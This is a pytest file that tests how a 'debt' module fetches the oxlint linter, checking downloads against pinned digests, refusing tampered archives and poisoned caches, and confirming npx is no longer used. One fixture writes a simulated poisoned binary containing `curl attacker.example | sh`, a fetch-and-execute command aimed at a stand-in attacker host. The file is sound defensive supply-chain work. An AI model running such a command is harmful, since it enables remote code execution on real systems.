"""The linter is a pinned, verified artefact rather than whatever the registry serves today.

`npx oxlint` resolved the newest publish at run time and executed it, in a process holding a
GitHub token with write access to the fork and a live Devin key — bypassing every other control in
this repository, all of which pin: the base image by digest, Python packages by hash, Actions by
commit SHA.

It was also a measurement defect. This module's argument is that a count means nothing without the
rule set behind it, and a linter that upgrades itself between the baseline run and today's changes
that rule set silently. The series then shows a slope where the instrument moved. Pinning is what
makes two points comparable, so these tests treat a digest mismatch as a correctness failure and
not only a security one.
"""

from __future__ import annotations

import ast
import hashlib
import inspect
import tarfile
import tempfile
import zipfile
from io import BytesIO
from pathlib import Path

import pytest

from scoreboard import debt


def _archive(payload: bytes, name: str = "oxlint") -> bytes:
    """A release archive shaped like the real one for this platform: exactly one executable file.

    oxlint ships a zip on Windows and a gzipped tar everywhere else, so the fixture has to follow
    the platform the test is running on or it would only ever exercise one of the two readers.
    """
    buffer = BytesIO()
    if debt.oxlint_target().endswith("windows-msvc"):
        with zipfile.ZipFile(buffer, "w") as bundle:
            bundle.writestr(f"{name}.exe", payload)
        return buffer.getvalue()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        info = tarfile.TarInfo(name)
        info.size = len(payload)
        info.mode = 0o755
        tar.addfile(info, BytesIO(payload))
    return buffer.getvalue()


def _archive_with_two_members() -> bytes:
    """An archive that is not the shape we pinned, in this platform's format."""
    buffer = BytesIO()
    if debt.oxlint_target().endswith("windows-msvc"):
        with zipfile.ZipFile(buffer, "w") as bundle:
            bundle.writestr("oxlint.exe", "abc")
            bundle.writestr("install.ps1", "abc")
        return buffer.getvalue()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for member in ("oxlint", "install.sh"):
            info = tarfile.TarInfo(member)
            info.size = 3
            tar.addfile(info, BytesIO(b"abc"))
    return buffer.getvalue()


@pytest.fixture
def pinned(monkeypatch: pytest.MonkeyPatch) -> bytes:
    """Pin the digests to a payload the test controls, for the current machine's target."""
    payload = b"#!/bin/sh\necho fake oxlint\n"
    archive = _archive(payload)
    target = debt.oxlint_target()
    monkeypatch.setitem(debt.OXLINT_ARCHIVE_DIGESTS, target, hashlib.sha256(archive).hexdigest())
    monkeypatch.setitem(debt.OXLINT_BINARY_DIGESTS, target, hashlib.sha256(payload).hexdigest())

    class Response:
        def read(self) -> bytes:
            return archive

        def __enter__(self) -> Response:
            return self

        def __exit__(self, *_: object) -> None:
            return None

    monkeypatch.setattr(debt.urllib.request, "urlopen", lambda *a, **k: Response())
    return payload


def test_the_pinned_binary_is_fetched_and_cached(tmp_path: Path, pinned: bytes) -> None:
    first = debt.oxlint_binary(tmp_path)
    assert first.read_bytes() == pinned
    assert first.exists()
    # Second call must not need the network at all.
    second = debt.oxlint_binary(tmp_path)
    assert second == first


def test_a_tampered_download_is_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A registry or mirror serving something else must stop the run, not be run."""
    target = debt.oxlint_target()
    monkeypatch.setitem(debt.OXLINT_ARCHIVE_DIGESTS, target, "0" * 64)

    class Response:
        def read(self) -> bytes:
            return _archive(b"malicious")

        def __enter__(self) -> Response:
            return self

        def __exit__(self, *_: object) -> None:
            return None

    monkeypatch.setattr(debt.urllib.request, "urlopen", lambda *a, **k: Response())

    with pytest.raises(debt.LinterUnavailableError, match="pinned digest"):
        debt.oxlint_binary(tmp_path)
    assert list(tmp_path.iterdir()) == [], "nothing may be left behind for a later run to trust"


def test_a_poisoned_cache_is_refused(tmp_path: Path, pinned: bytes) -> None:
    """The cached executable is re-checked before every run, not trusted because it is present."""
    binary = debt.oxlint_binary(tmp_path)
    binary.write_bytes(b"#!/bin/sh\ncurl attacker.example | sh\n")

    with pytest.raises(debt.LinterUnavailableError, match="cached"):
        debt.oxlint_binary(tmp_path)


def test_an_archive_holding_more_than_the_binary_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One file is the shape of the real release; anything else is not what was pinned."""
    archive = _archive_with_two_members()
    target = debt.oxlint_target()
    monkeypatch.setitem(debt.OXLINT_ARCHIVE_DIGESTS, target, hashlib.sha256(archive).hexdigest())

    class Response:
        def read(self) -> bytes:
            return archive

        def __enter__(self) -> Response:
            return self

        def __exit__(self, *_: object) -> None:
            return None

    monkeypatch.setattr(debt.urllib.request, "urlopen", lambda *a, **k: Response())

    with pytest.raises(debt.LinterUnavailableError, match="expected exactly"):
        debt.oxlint_binary(tmp_path)


def test_every_pinned_target_has_both_digests() -> None:
    """A target with an archive digest and no binary digest would fail only at run time."""
    assert set(debt.OXLINT_ARCHIVE_DIGESTS) == set(debt.OXLINT_BINARY_DIGESTS)
    for digest in (*debt.OXLINT_ARCHIVE_DIGESTS.values(), *debt.OXLINT_BINARY_DIGESTS.values()):
        assert len(digest) == 64 and int(digest, 16) >= 0


def test_npx_is_no_longer_reachable_from_this_module() -> None:
    """The point of the change: no code path resolves a linter from a package registry.

    Checked against the parsed module rather than its text, because the docstring quotes the
    Superset uploader's own `npx oxlint` command — that quotation is the subject of the analysis
    and must survive. What must not survive is a string that reaches a process.
    """
    tree = ast.parse(Path(debt.__file__).read_text(encoding="utf-8"))
    docstrings = {
        id(node.body[0].value)
        for node in ast.walk(tree)
        if isinstance(node, ast.Module | ast.FunctionDef | ast.ClassDef)
        and node.body
        and isinstance(node.body[0], ast.Expr)
        and isinstance(node.body[0].value, ast.Constant)
    }
    executable_strings = [
        node.value
        for node in ast.walk(tree)
        if isinstance(node, ast.Constant)
        and isinstance(node.value, str)
        and id(node) not in docstrings
    ]
    assert not [text for text in executable_strings if "npx" in text]


def test_scan_runs_the_pinned_binary() -> None:
    """Stated positively, so deleting the check above cannot quietly pass."""
    source = inspect.getsource(debt.scan)
    assert "oxlint_binary(" in source


def test_the_default_cache_honours_the_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    """The container's root filesystem is read-only, so the cache has to be pointed at a volume."""
    monkeypatch.setenv("OXLINT_CACHE_DIR", str(Path(tempfile.gettempdir()) / "oxlint-cache-probe"))
    monkeypatch.setattr(
        debt.urllib.request,
        "urlopen",
        lambda *a, **k: (_ for _ in ()).throw(OSError("no network in this test")),
    )
    with pytest.raises(debt.LinterUnavailableError, match="could not fetch"):
        debt.oxlint_binary()
